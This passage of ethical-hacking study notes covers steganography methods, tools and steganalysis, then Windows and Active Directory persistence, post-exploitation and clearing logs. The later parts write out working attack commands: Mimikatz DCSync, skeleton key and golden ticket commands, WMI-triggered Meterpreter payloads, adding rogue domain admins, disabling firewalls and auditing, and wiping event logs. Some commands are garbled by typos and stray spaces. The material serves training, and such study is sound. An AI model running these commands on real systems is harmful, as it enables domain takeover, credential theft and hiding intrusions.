						- Null Cipher : This technique hides a message within a large amount of irrelevant data. The original message is mixed with the unused data in a specific order—horizontally, diagonally, vertically, or in reverse—making it unintelligible to anyone who does not know the correct order.
						- Grille Cipher : This technique encrypts plaintext by writing it onto a sheet of paper through a pierced (or stenciled) sheet of paper, cardboard, or a similar material. The message can be deciphered using an identical grille. This system is difficult to crack, as only someone with the correct grille can extract the hidden message.
					- Jargon Code : In this type of steganography, a specific language or jargon is used that is meaningful only to a particular group of people, while remaining incomprehensible to others. A jargon code functions similarly to a substitution cipher but replaces entire words instead of individual letters.
		- Types of Steganography based on Cover Medium:
			- Image Steganography :
				- Image File Steganography Techniques:
					- Least-Significant-Bit Insertion : The least-significant-bit (LSB) insertion technique is a widely used method in image steganography, where the rightmost bit of each pixel holds secret data. In this method, the binary data of the message is divided and embedded into the LSB of each pixel in a predetermined sequence. Modifying the LSB causes minimal changes to the image, resulting in no visible difference to the human eye and making detection difficult.
					- Masking and Filtering : Masking and filtering techniques exploit human vision's inability to detect subtle changes in images. Similar to watermarks on paper, these methods use grayscale images or digital watermarks to conceal information. Masking hides secret data by embedding it within an image file.
					- Algorithms and Transformation : The algorithms and transformation technique hides secret information during image compression by applying compression algorithms and transformation functions. This method uses mathematical functions to conceal data by embedding it in the least significant coefficients during the compression process.
						- Types of Transformation used in the Compression Algorithm:
							- Fast Fourier transformation
							- Discrete cosine transformation
							- Wavelet transformation
			- Document steganography
			- Folder Steganography
			- Video Steganography
			- Audio Steganography
				- Audio Steganography Methods:
					- Echo Data Hiding : The echo data hiding method embeds secret information in audio by adding an echo with controlled parameters - amplitude, decay rate, and delay. Imperceptible delay times encode binary data, while the parameters remain below audible thresholds, ensuring the hidden data blends seamlessly with the carrier signal.
					- Spread Spectrum Method:
						- Direct-Sequence Spread Spectrum (DSSS) : DSSS is a frequency modulation technique that spreads a low-bandwidth signal over a broad frequency range, allowing multiple users to share a single channel. In DSSS steganography, secret messages are embedded in radio wave frequencies, though the method may introduce some random noise to the signal.
						- Frequency-Hopping Spread Spectrum (FHSS) : In FHSS, the frequency spectrum of an audio file is rapidly altered, hopping between different frequencies. This spread spectrum method is crucial for secure communications in both commercial and military applications.
						- LSB Coding : LSB encoding embeds a secret binary message in the least significant bit of each audio signal sample, enabling the hiding of large data volumes. While using the last two bits increases capacity, it risks adding noise. However, its poor resistance to manipulation makes it less reliable, as channel noise and resampling can easily reveal hidden data.
						- Tone Insertion : This method embeds data in an audio signal by inserting inaudible low-power tones, concealed by louder audio signals. It is difficult for eavesdroppers to detect the secret message, offering protection against attacks like low-pass filtering and bit truncation. Audio steganography software uses this technique to embed secret data in audio files.
						- Phase Encoding : Phase coding substitutes the phase of an audio segment with a reference phase to represent data. It encodes secret message bits as phase shifts in the phase spectrum of a digital signal, achieving soft encoding with a favorable signal-to-noise ratio.
			- Whitespace Steganography : Whitespace steganography hides messages in ASCII text by appending invisible spaces and tabs to the ends of lines. Since these characters are not typically visible in text viewers, the message remains hidden from casual observers. With built-in encryption, the message remains unreadable even if detected.
			- Web Steganography : In web steganography, a user hides web objects behind other objects and uploads them to a web server.
			- Spam/Email Steganography
			- Natural Text Steganography : Natural text steganography is the process of converting sensitive information into user-defined free text, such as a play.
			- Hidden OS Steganography : Hidden OS steganography is the process of concealing one operating system within another.
			- C++ Source-Code Steganography : In C++ source-code steganography, a user hides a set of tools within the source code files.
			- Compressed Data Steganography : In compressed data steganography, information is hidden in the least significant or reserved bits of compressed files. This technique leverages file compression methods (e.g., ZIP, RAR, JPEG, PNG) to conceal secret data, making it undetectable to unauthorized parties.
		- Steganography Tools:
			- Whitespace:
				- Snow : SNOW conceals messages in ASCII text by appending invisible whitespace (spaces and tabs) to the end of lines, hiding the message from casual observers. If its built-in encryption is used, the message remains unreadable even if detected, exploiting the steganographic nature of whitespace.
			- Image:
				- OpenStego : OpenStego is a steganography application that allows data hiding by embedding any data within an image file and watermarking by adding an invisible signature to image files, which can be used to detect unauthorized copying.
				- Steghide : Steghide is a steganography program that can hide data within various image and audio files. It preserves color and sample frequencies, making the embedded data resistant to first-order statistical tests.
				- StegOnline : StegOnline is an open-source, web-based steganography toolkit designed to simplify the creation and solving of steganography challenges.
				- SSuite Picsel : SSuite Picsel secures text messages using steganographic encryption.
				- CryptaPix : CryptaPix is an image file management and encryption program for Windows that organizes, prints, and secures digital photos and downloaded image files.
				- Gifshuffle : Gifshuffle conceals messages in GIF images by shuffling the colormap, leaving the image visually unchanged. It supports all GIF images, including those with transparency and animation, and also provides compression and encryption for the hidden message.
				- Coagula
			- Document:
				- StegoStick : A steganographic tool that allows users to hide any file within another file. It is based on image, audio, and video steganography, enabling users to conceal files or messages within image formats (BMP, JPG, GIF), audio/video formats (MPG, WAV, etc.), or other file formats (PDF, EXE, CHM, etc.).
				- StegJ : A cross-platform steganography software written entirely in Java, featuring robust AES support.
				- Office XML : Office XML Steganography Tool adds a file to a Microsoft Office document and edits the [Content_Types].xml to prevent Office programs from flagging the file as corrupted.
				- Snow : SNOW conceals messages in ASCII text by appending invisible whitespace (spaces and tabs) to the end of lines, hiding the message from casual observers. If its built-in encryption is used, the message remains unreadable even if detected, exploiting the steganographic nature of whitespace.
				- Data Stash : Data Stash is a steganographic security tool that hides sensitive data files within other files using steganography. A large bitmap, database file, or any other file can be selected as a receptacle, and data files can be added using an easy drag-and-drop mechanism.
			- Video:
				- OmniHide Pro : OmniHide PRO conceals secret files within ordinary images, videos, or music files. The resulting stego file can be used or shared like any normal file, keeping its hidden content undetectable. It also secures the hidden file with a password for added protection.
				- RT Steganography : Real-Time Steganography in Video Streaming Technology enables the transmission of hidden data (text, binary, etc.) within a video while it is being streamed to the recipient.
				- StegoStick : A steganographic tool that allows users to hide any file within another file. It is based on image, audio, and video steganography, enabling users to conceal files or messages within image formats (BMP, JPG, GIF), audio/video formats (MPG, WAV, etc.), or other file formats (PDF, EXE, CHM, etc.).
				- OpenPuff : OpenPuff is a professional steganography tool used to hide data within carrier files such as images, audio, videos, or other media formats. It supports multi-level security by combining password protection, cryptographic techniques, and carrier chaining (splitting the hidden data across multiple carriers).
				- MSU StegoVideo : MSU StegoVideo is a unique tool for hiding any file within a video sequence, available as a VirtualDub filter or standalone executable.
			- Audio:
				- DeepSound : DeepSound is a steganography tool and audio converter that hides secret data within audio files. It also extracts hidden files directly from audio files or CD tracks.
				- BitCrypt : BitCrypt is an advanced encryption utility that enables the undetectable storage and transmission of information. It can be used to store plaintext securely, hiding it from third parties, or to transmit information over the Internet.
				- StegoStick : A steganographic tool that allows users to hide any file within another file. It is based on image, audio, and video steganography, enabling users to conceal files or messages within image formats (BMP, JPG, GIF), audio/video formats (MPG, WAV, etc.), or other file formats (PDF, EXE, CHM, etc.).
				- MP3Stego : MP3Stego hides information in MP3 files during the compression process by first compressing and encrypting the data, then embedding it into the MP3 bitstream.
				- QuickCrypto : Hide files on the system so only the owner can recover and access them. Conceal sensitive data (text and any file type) within innocent 'carrier' files like JPEG, GIF, BMP, MP3, and WAV. Easily blend encrypted files and messages into various other files.
				- Spectrology : Images to audio files with corresponding spectrograms encoder.
			- Folder:
				- GiliSoft File Lock Pro : It is a military-grade encryption tool that secures files by locking folders on internal and external drives, including USB, flash, thumb, memory cards, and network drives. It encrypts, hides, and makes files, folders, and drives read-only, as well as password-protects them.
				- Folder Lock : File locking software that Locks folders and Encrypts files.
				- Hide Folders 5 : Hide Folders is a software application that password-protects private information on a hard drive, allowing files and folders to be made inaccessible, invisible, or protected from modification or removal.
				- InvisibleSecrets : Encrypt file contents, hide files and emails, and prevent unauthorized access to private documents.
				- QuickCrypto : Hide files on the system so only the owner can recover and access them. Conceal sensitive data (text and any file type) within innocent 'carrier' files like JPEG, GIF, BMP, MP3, and WAV. Easily blend encrypted files and messages into various other files.
			- Spam/Email:
				- Spam Mimic : Spam Mimic is a spam "grammar" for a mimic engine created by Peter Wayner. It encodes secret messages into innocent-looking spam emails. The tool's encoder hides the secret message within spam, using elements like a password, fake PGP, fake Russian text, and spacing.
		- Steganalysis:
			- Steganalysis is the process of detecting and extracting covert messages hidden using steganography. It identifies hidden messages embedded in images, text, audio, and video carrier mediums, serving as the reverse process of steganography.
			- Steganalysis has two aspects: detection and distortion of messages. In the detection phase, the analyst examines the relationships between the steganography tools, stego-media, cover, and message. In the distortion phase, the analyst manipulates the stego-media to extract the embedded message and determines if it is useless and should be removed.
			- Steganalysis Methods/ Attacks on Steganography:
				- Stego-only : In a stego-only attack, the steganalyst or attacker only has access to the stego-medium or stego-object, with no additional information. The goal is to try every possible steganography algorithm and related attack to recover the hidden information.
				- Known-stego : This attack allows the attacker to know the steganography algorithm, as well as both the original and stego-objects, enabling the extraction of the hidden information using the available data.
				- Known-message : The known-message attack assumes access to both the message and the stego-medium. With this information, the attacker can detect the technique used to hide the message.
				- Known-cover : In a known-cover attack, attackers have access to both the stego-object and the original cover medium. This allows them to compare the two and detect changes in the medium's format to uncover the hidden message.
				- Chosen-message : In this attack, the steganalyst uses a known message to generate a stego-object with various steganography tools, aiming to identify the algorithm used to hide the information. The goal is to detect patterns in the stego-object that may indicate the specific steganography tools or algorithms employed.
				- Chosen-stego : The chosen-stego attack occurs when the steganalyst knows both the stego-object and the steganography tool or algorithm used to hide the message.
				- Chi-square : The chi-square method uses probability analysis to test whether a stego-object and the original data are identical. If the difference is nearly zero, no data is embedded; otherwise, the stego-object contains hidden data.
				- Distinguishing Statistical : In the distinguishing statistical method, the steganalyst or attacker analyzes statistical changes caused by the embedded algorithm, along with the length of the hidden data, to detect the presence of embedded information.
				- Blind Classifier : In the blind classifier method, a blind detector is provided with the original or unmodified data to learn its characteristics from multiple perspectives. The output is then used to train a classifier to detect differences between the stego-object and the original data.
			- Detecting Steganography:
				- Text File : In text steganography, data is hidden by altering character positions, which can be detected through patterns, language use, line height, or unusual blank spaces. A simple word processor may reveal these alterations by displaying spaces, tabs, and other hidden characters. Detection can focus on unusual patterns, extra spaces, and invisible characters in the stego-object.
				- Image File : Hidden information in an image can be detected by analyzing changes in size, file format, timestamps, and the color palette. Key detection indicators include display distortions, image degradation, anomalies in color composition, luminance, pixel relationships, and exaggerated noise. Statistical analysis helps identify steganography by examining the least significant bits (LSBs), which become non-random when a secret message is embedded. By comparing LSBs with random values, statistical methods can reveal hidden data, particularly when encrypted data with high entropy is used.
				- Audio File : Audio steganography embeds confidential information, such as private documents and files, into digital sound. Statistical analysis can detect it by examining LSB modifications and scanning inaudible frequencies for hidden data. Odd distortions and patterns in the audio signal often reveal the presence of secret information.
				- Video File : Detection of secret data in video files combines methods used for both image and audio files. Special code signs and gestures can also assist in identifying hidden information.
		- Steganography Detection Tools:
			- zsteg : The zsteg tool is used to detect stegano-hidden data in PNG and BMP image files.
			- StegoVeritas : StegoVeritas is a versatile steganography tool that supports multiple image types and default actions, with options for tasks like extracting LSB, color mapping, and more.
			- Stegextract : Stegextract is a Bash script that extracts hidden files and strings from images, supporting PNG, JPG, and GIF formats. It retrieves trailing data after the image's closing bytes and any hidden files embedded within the image.
			- StegoHunt MP : StegoHunt MP is the next generation of WetStone’s industry-leading steganography detection and steganalysis suite. It effectively detects the presence of steganography and data-hiding programs, as well as the carrier files in which hidden data payloads may reside.
			- Steganography Studio : Steganography Studio is a tool for learning, using, and analyzing key steganographic algorithms. It implements several highly configurable algorithms with various filters, as well as advanced image analysis algorithms for detecting hidden information.
			- Virtual Steganographic Laboratory (VSL) : The Virtual Steganographic Laboratory (VSL) is a graphical block diagramming tool that enables the use, testing, and adjustment of methods for both image steganography and steganalysis. VSL features a simple GUI and a modular, plug-in architecture.
- Establishing Persistence
	- Maintaining Persistence Using Windows Sticky Keys:
		- In Windows, the Sticky Keys feature allows users to use modifier keys like Ctrl, Alt, and Shift without pressing them simultaneously. Attackers can exploit this feature to maintain persistence. After gaining access to a remote system, attackers can escalate their privileges using the BypassUAC exploit in Metasploit. Once privileges are escalated, they can use the Sticky Keys module in Metasploit to maintain persistence on the compromised system. When the attacker restarts the system and presses the Shift key five times, a Command Prompt window opens with system-level access.
	- Maintaining Persistence by Abusing Boot or Logon Autostart Executions:
		- Attackers exploit system boot or logon autostart programs to escalate privileges and maintain persistence by applying custom configuration settings on a compromised machine. This allows attackers to automatically run programs during system boot or logon. They typically use two methods to abuse autostart execution: registry run keys and startup folders.
		- Executing Logon Autostart:
			- Registry Run Keys:
				- Enumerating Assign Permissions Using WinPEAS:
					- Attackers can use the WinPEAS script to identify potential paths for privilege escalation within Windows.
					- Enumerate permissions: winPEASx64.exe quiet applicationinfo
					- This command enables attackers to enumerate all permissions assigned to a valid user for a specific service.
			- Startup Folder:
				- Attackers can inject malicious applications into the startup folder, causing them to run automatically when a user signs into their account. They can escalate privileges by exploiting and manipulating the startup folder's locations.
				- Abusing Startup Folder Using icacls:
					- Misconfigured locations in a startup folder can be exploited by attackers to inject malicious payloads, such as Remote Access Trojans (RATs), enabling them to maintain persistence.
					- Enumerate permissions: icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
				- Using Sysinternals tool (accesschk.exe) for Identifying Permissions:
					- accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
	- Domain Dominance Through Different Paths:
		- Domain dominance is the process of gaining control over critical assets, such as domain controllers, on a target system to access other networked resources. Attackers often use social engineering techniques to launch domain dominance attacks by compromising an internal user.
		- Domain Dominance Techniques:
			- Remote Code Execution:
				- Attackers attempt to execute malicious code on the target domain controller (DC) via the command-line interface (CLI) to initiate a domain dominance attack. By leveraging this technique, attackers can maintain persistence, enabling them to carry out malicious activities over an extended period without detection.
				- Steps:
					- Create a Dummy Process and User on the Target DC - Use WMI to create a dummy user and process on the target domain controller (DC):
						- wmic /node:<DomainControllerName> process call create "net user /add PiratedProcess Du^^Y01"
						- Here, PiratedProcess is the username, and Du^^Y01 is the password for the dummy user created on the target DC.
					- Add the User to the "Admins" Group: PsExec.exe \\<DomainControllerName> -accepteula net localgroup "Admins" PiratedProcess /add
					- Identify the Created User in Active Directory Users and Computers (ADUC) - Navigate to Active Directory Users and Computers (ADUC) and locate the user created using the above command.
					- Verify Membership in the "Admins" Group - Open the properties window for the created user in ADUC. Navigate to the Member Of tab to confirm their membership in the "Admins" group.
					- After successfully adding a new user to the "Admins" group, the attacker uses the newly created credentials to maintain persistence on the target domain controller (DC).
			- Abusing Data Protection API (DPAPI):
				- The Data Protection API (DPAPI) is a unified framework in Windows environments that securely stores cryptographically protected files, browser passwords, and other sensitive data. Windows domain controllers (DCs) hold a master key that can decrypt DPAPI-protected files.
				- Recover the master key with Mimikatz using the password of a compromised user.
				- Retrieve all local master keys with compromised admin credentials: sekurlsa::dpapi
				- Retrieve all backup master keys: lsadump::backupkeys /system:dc01.offense.local /export
				- Cross-check whether the secured master keys have been obtained by navigating to the directory containing the mimikatz.exe file and looking for file formats such as .der, .key, .pvk, and .pfx. By obtaining the master key, the attacker can decrypt any DPAPI-encrypted file from any device on the network, enabling them to maintain persistence.
			- Malicious Replication:
				- It allows attackers to create an exact copy of user data using administrative credentials. Attackers often target sensitive accounts, such as "krbtgt," to replicate them.
				- Malicious replication: Invoke-Mimikatz -command '"lsadump::dcsync /domain:<Target Domain> /user:<krbtgt>\<Any Domain User>"
			- Skeleton Key Attack:
				- A skeleton key is a type of malware that attackers use to inject false credentials into domain controllers, creating a backdoor password. It is a memory-resident virus that allows an attacker to obtain a master password, enabling them to authenticate as a legitimate user within the domain.
				- Working of the Skeleton Key Attack:
					- This attack is straightforward and only requires executing misc::skeleton on each domain controller.
					- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' - <target domain controller name>
					- With this, the attacker can masquerade as any user using the default Mimikatz credentials.
					- Attackers can also execute skeleton key attacks by patching the Local Security Authority Subsystem Service (LSASS). They leverage their access to the domain to install malware on the domain controllers (DCs), which then auto-patches the LSASS, generating a new skeleton key or master password that works for all users.
					- The error shown in the above screenshot appears if LSASS has already been patched with skeleton keys. Alternatively, attackers can use the Empire tool, which includes a module that automates the process by running Mimikatz entirely in memory, preventing the binary from being dropped on the domain controller (DC).
					- powershell/persistence/misc/skeleton_key
			- Golden Ticket Attack:
				- A golden ticket attack is a post-exploitation technique used by attackers to gain complete control over the entire Active Directory (AD). Attackers execute this attack by exploiting the Kerberos authentication protocol, forging Ticket Granting Tickets (TGTs) after compromising a Key Distribution Center (KDC) account (KRBTGT), which grants access to various resources. This attack enables attackers to maintain persistence and gather more information within the AD by masquerading as privileged users.
				- Working of Golden Ticket Attack:
					- Attackers typically compromise a valid user account either through phishing emails or by exploiting vulnerabilities or security misconfigurations.
					- Attackers gather domain information, such as the domain name and domain security identifier (SID), using the whoami command.
					- Elevate privileges to the domain administrator-level account to steal the NTLM hash of KRBTGT. Use Mimikatz to perform a pass-the-hash or DCSync attack to extract KRBTGT's password hash:
					- lsadump::dcsync /domain:<domain_name> /user:krbtgt
					- After obtaining the password hashes, use the Mimikatz command to create a golden ticket by impersonating an administrator-level user. This grants access to any resource, group, or domain within the environment:
					- kerberos::golden /domain:<domain_name> /sid:<SID> /rc4:<KRBTGT_hash> /id:<value> /user:<username>
					- The final step can also be executed using the NTLM hashes obtained from a malicious replication process.
					- Attackers maintain persistence by configuring the ticket's validity period. 
			- Silver Ticket Attack:
				- A silver ticket attack is a post-exploitation technique used by attackers to steal legitimate users’ credentials and forge a fake Kerberos Ticket Granting Service (TGS) ticket. To initiate this attack, the attacker must have access to credentials obtained from a local service account or the system’s SAM database. The attacker then creates a forged Kerberos TGS ticket using the Mimikatz tool to establish a connection with the target service.
				- The attacker initially compromises the target system through techniques such as phishing or vulnerability exploitation. After gaining access to a networked system, the attacker initiates the silver ticket attack by forging a false Kerberos silver ticket.
					- The attacker gathers domain information, such as the domain name and domain security identifier (SID), using the whoami command.
					- The attacker obtains additional details about the service or service type to target.
					- The attacker deploys password-cracking tools, such as Mimikatz, on the compromised system to extract the Kerberos service’s local NTLM password hash.
					- The attacker initiates offline password attacks, such as Kerberoasting, to obtain a raw or plaintext password for the service.
					- The attacker forges a Kerberos TGS ticket using Mimikatz to establish a connection with the target service.
					- The attacker uses both the forged TGS and the hash data to authenticate the local service as a legitimate user.
					- The attacker exploits the TGS to elevate privileges and permissions.
					- Note: Privilege Attribute Certificate (PAC) validation requests and PAC validation responses are optional in a silver ticket attack.
					- If an attacker successfully elevates privileges and obtains admin rights to execute code on a local machine, they can run the following command to retrieve the NTLM hashes of the AD system’s password:
					- mimikatz “privilege::debug” “sekurlsa::logonpasswords”
	- Maintain Domain Persistence Through AdminSDHolder:
		- AdminSDHolder is an object in Active Directory that protects user accounts and groups with high privileges from accidental modifications to security permissions. Attackers with admin privileges on a compromised domain can abuse the SDProp process to establish persistence. They can add a user account to the ACL to gain "GenericAll" privileges, which are equivalent to the privileges of a domain administrator.\
		- Establishing Domain Persistence by Abusing AdminSDHolder:
			- Add user account Martin to the ACL:
				- Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
			- SDProp process retrieves the ACL to check whether the Martin account has “GenericAll” permissions:
				- Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs
			- Change the default time of SDProp to 3 min by modifying the registry:
				- REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
			- Add the account Martin to the group Domain Admins using the following command:
				- net group “Domain Admins” Martin /add /domain
			- Check the accessibility of the domain controller (DC) through which domain persistence is created:
				- dir \\10.10.1.22\c$
	- Maintaining Persistence Through WMI Event Subscription:
		- Attackers exploit Windows Management Instrumentation (WMI) event subscriptions to execute malicious content and establish persistence on a target system. By leveraging various scripts and techniques, they manipulate WMI's features to create event subscriptions for malicious triggers. When these events occur, they initiate the execution of arbitrary code, enabling attackers to maintain persistence. These scripts further automate the process by concealing malicious payloads and ensuring persistence, even after the system is rebooted or restarted.
		- Techniques to Maintain Persistence Using WMI Event Subscription:
			- Using Command Prompt:
				- Use wmic commands create a malicious namespace and subscription for the events:
					- eSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
					- wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="EthicalHacker", ExecutablePath="C:\Windows\System32\ethicalhacker.exe",CommandLin eTemplate="C:\Windows\System32\thicalhacker.exe"
					- wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"EthicalHacker\"", Consumer="CommandLineEventConsumer.Name=\"EthicalHacker\""
				- The malicious payload is designed to automatically execute within 60 seconds of every system restart, establishing a Meterpreter session with the attacker.
			- Using Wmi-Persistence:
				- Attackers also utilize Wmi-Persistence, a PowerShell script, to perform WMI event subscriptions and achieve persistence. This script triggers various actions, including Startup, Logon, Interval, and Timed events, enabling attackers to execute multiple functions such as the installation, review, and removal of WMI event subscriptions.
				- Execute malicious payload on the compromised system and achieve persistence:
				- Install-Persistence -Trigger Startup -Payload "c:\windows\system32\ethicalhacker.exe"
				- The above command includes a Startup trigger that executes the specified payload within 5 minutes of a system reboot, establishing a Meterpreter session with the attacker.
			- Using PowerLurk:
				- PowerLurk is a PowerShell toolset for creating malicious WMI event subscriptions. The goal of PowerLurk is to simplify the process of triggering WMI events during penetration tests or red-team engagements. Attackers use PowerLurk to create malicious WMI event subscriptions that execute arbitrary payloads on every Windows logon. This script can trigger events such as InsertUSB, UserLogon, Timed, Interval, and ProcessStart.
				- Import the PowerLurk script to a local instance: Import-Module .\PowerLurk.ps1
				- Identify all the active WMI event objects: Get-WmiEvent
				- Create a malicious event subscription that executes the malicious payload and creates a Meterpreter session:
				- Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any
	- Overpass-the-Hash Attack:
		- The Overpass-the-Hash (OPtH) attack is an extension of the Pass-the-Ticket and Pass-the-Hash attacks. It is a type of credential theft-and-reuse attack that allows attackers to perform malicious activities on compromised devices or within a compromised environment. The primary goal of an OPtH attack is to acquire Kerberos tickets using the NTLM hash of different user accounts.
		- Mimikatz to perform OPtH attacks:
			- The Mimikatz tool allows attackers to obtain and store various authentication credentials, such as Kerberos tickets. It aids attackers in stealing credentials and performing privilege escalation.
			- Perform the attack and obtain AES128, NTLM (RC4), and AES256 keys for a Kerberos ticket:
				- privilege::debug
				- sekurlsa::ekeys
	- Linux Post-Exploitation:
		- After compromising a target system and gaining shell access, attackers typically attempt further exploitation to gain full access to additional resources and establish long-term persistence.
		- File-System Commands:
			- Discovers SUID-executable binaries: find / -perm -3000 -ls 2> /dev/null
			- Discovers world-writable files : find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w - ls 2> /dev/null
			- Disables write access to a file : chmod o-w file
			- Discovers world-writable directories : find / -path /sys -prune -o -path /proc -prune -o -type d -perm -o=w - ls 2> /dev/null
			- Discovers .txt files on the system : find / -name "*.txt" -ls 2> /dev/null
			- Displays the list of permitted and forbidden commands : sudo -l
			- Displays all certificates’ details : openssl s_client -connect <hostname>:<port> -showcerts
			- Displays contents of keystore files and alias names : keytool -list -v -keystore keystore.jks
		- Information-Gathering Commands:
			- Displays the current process along with its process ID (PID) : ps -ef
			- Attaches a file system to the directory tree structure : mount
			- Displays host/network names in numeric form : route -n
			- Displays network configuration details : /sbin/ifconfig -a
			- Displays running cron jobs : cat /etc/crontab
			- Displays the software package used for the specified cron job : ls -la /etc/cron.d
			- Displays directories that can be exported to NFS clients : cat /etc/exports
			- Displays the OS version details : cat /etc/redhat* /etc/debian* /etc/*release
			- Lists bootup services : ls /etc/rc*
			- Displays all the users who have shell access : egrep -e '/bin/(ba)?sh' /etc/passwd
			- Displays SSH relationships and login details : cat ~/.ssh/
			- Display information about the CPU(s) on the machine: cat /proc/cpuinfo
			- Display information about the system's memory usage: cat /proc/meminfo
	- Windows Post-Exploitation:
		- Once attackers compromise a system and gain shell access, they can carry out various malicious activities without the user's knowledge. The primary goal of post-exploitation is to gain full control over the system and maintain persistence over time.
		- File-System Commands:
			- Retrieves the directory names with hidden attributes : dir /a:h
			- Retrieves all the text files : findstr /E ".txt" > txt.txt
			- Retrieves all the log files : findstr /E ".log" > log.txt
			- Retrieves all the document files : findstr /E ".doc" > doc.txt
		- Hash Computing Commands:
			- Generates MD5 hashes : Get-FileHash <file-name> -a md5
			- Generates SHA-1 hashes : Get-FileHash <file-name> -a sha1
			- Retrieves SHA-256 hashes by default : Get-FileHash <file-name>
		- Registry Commands:
			- Detects the registry hives for the value “credential” : reg query HKEY_LOCAL_MACHINE/f credential /t REG_SZ /s > hklm_password.txt
			- Checks whether any package is installed with elevated privileges. If value is "1", the installer uses elevated privileges for installing applications : reg query HKEY_LOCAL_MACHINE\SOFTWARE\P olicies\Microsoft\Windows\I nstaller /v AlwaysInstallElevated > reg_always.txt
			- Provides a list of all programs to query a registry : reg query HKEY_LOCAL_MACHINE\Software\M icrosoft\Windows\CurrentVer sion\Uninstall >> ListofInstalledPrograms.txt
		- Scheduler Commands:
			- Retrieves the scheduled task list : schtasks /query /fo LIST /v > schtasks.txt
			- Retrieves all currently active processes : tasklist /SVC > tasklist.txt
		- WMIC Commands:
			- Reboots Windows : wmic os Primary='TRUE' reboot
			- Retrieves the service name, path of the executable, etc. : wmic service get name,displayname,pathname,s tartmode > wmic_service.txt
			- Displays the details of the installed software : wmic /node:"" product get name,version,vendor
			- Retrieves the processor’s details : wmic cpu get
			- Retrieves login names and their SIDs : wmic useraccount get name,sid
		- Net Commands:
			- Shows domain connection details : net config rdr
			- Adds a computer to the domain : net computer \\computername /add
			- Displays the list of computers and networks devices in the domain : net view
			- Displays the name of the host computer : net view \\host
			- Helps manage shared resources with the appropriate parameters : net share
		- Network Commands:
			- Displays routing tables for the destination : route print or netstat -r command
			- Shows the ARP table for a specific IP address : arp -a
			- Displays IP configuration details : ipconfig /all
			- Retrieves the physical address : getmac
		- Service Commands:
			- Lists all the available services : sc queryex type=service state=all
			- Lists details about the specified service : sc queryex type=service state=all | find /i "Name of the service: myService"
			- Starts/stops a network service : net start or stop
			- Displays the current firewall state : netsh firewall show state
			- Displays firewall settings : netsh firewall show config
			- Turns off the firewall service for the current profile : etsh advfirewall set currentprofile state off
			- Turns off the firewall service for all profiles : netsh advfirewall set allprofiles state off
		- Remote Execution Commands:
			- Retrieves the PC’s serial number : wmic /node:<IP address> /user:administrator /password:$PASSWORD bios get serialnumber
			- Terminates services associated with eset : taskkill.exe /S <IP address> /U domain\username /F /FI "eset"
			- Defines the user context to execute commands : tasklist.exe /S <IP address> /U domain\username
			- Retrieves all the processes running on the system that are not actually “SYSTEM” : tasklist.exe /S <IP address> /U domain\username /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"
		- Sysinternals Commands:
			- Establishes an interactive CMD with a remote system : psexec -i \\<RemoteSystem> cmd
			- Copies file.txt from the local machine to a remote computer : psexec -i \\<RemoteSystem> -c file.exe
			- Retrieves the contents of security keys and SAM : psexec -i -d -s c:\windows\regedit.exe
			- Displays a remote system’s network information : psexec -i \\<RemoteSystem> ipconfig /all
		- Authenticated WMI Exec via PowerShell:
			- Launches a suitable local exploit : msf > use exploit/windows/local/ps_wmi_exec
			- Displays the list of targets : msf exploit(windows/local/ps_wmi_exec) > show targets
			- Displays all the available options : msf exploit(windows/local/ps_wmi_exec) > show options
			- Displays possible payloads : msf exploit(windows/local/ps_wmi_exec) > show payloads
			- Displays suitable evasion options : msf exploit(windows/local/ps_wmi_exec) > show evasion


## Clearing Logs
- Covering Tracks
	- Once intruders have successfully gained administrator access to a system, they will attempt to cover their tracks to avoid detection.
	- Covering tracks is a key stage in system hacking where attackers erase or alter logs, error messages, and system configurations to avoid detection. By manipulating event logs and file attributes, they make it appear as if no compromise occurred, often using rootkits to disable logs. If maintaining long-term access, attackers selectively remove evidence from logs and restore file attributes. Detecting such changes can be difficult, but file hashes can identify tampered files.
	- Manipulate the log files:
		- SECEVENT.EVT (security) : failed logins, accessing files without privileges
		- SYSEVENT.EVT (system) : driver failure, things not operating correctly
		- APPEVENT.EVT (applications)
	- Techniques Used for Covering Tracks:
		- Disabling Auditing:
			- An attacker disables the auditing features of the target system.
			- Auditpol : Auditpol displays information about and allows manipulation of audit policies. Auditpol.exe is the command-line utility used to modify audit security settings at the category and sub-category levels. Attackers can use Auditpol to enable or disable security auditing on local or remote systems and adjust audit criteria for various categories of security events.
			- Enabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:enable /failure:enable
			- Disabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:disable /failure:disable
			- View defined auditing settings: auditpol /get /category:*
		- Clearing Logs:
			- An attacker clears or deletes system log entries related to their activities.
			- Clear_Event_Viewer_Logs.bat : Clear_Event_Viewer_Logs.bat is a utility used to wipe out the logs on the target system. It deletes the security, system, and application logs to cover the attacker’s tracks.
			- If the system is compromised with Metasploit, the attacker can use a Meterpreter shell to clear all logs from the Windows system. To do this, the attacker launches the Meterpreter shell prompt from the Metasploit Framework, then types the "clearev" command in the Meterpreter shell prompt and presses Enter. This will initiate the process of wiping out the logs on the target system.
			- Clear PowerShell logs using Clear-EventLog:
				- Clear the entries from the PowerShell event log: Clear-EventLog "Windows PowerShell"
				- Clear specific multiple log types: Clear-EventLog -LogName ODiag, OSession -ComputerName localhost, Server02
					- This command clears all the log entries in Microsoft Office Diagnostics (ODiag) and Microsoft Office Sessions (OSession) on the local computer and Server02 remote computer.
				- Clear all the logs on the specified systems, and then display the event log list: Clear-EventLog -LogName application, system -confirm
			- Clear event logs using wevtutil utility:
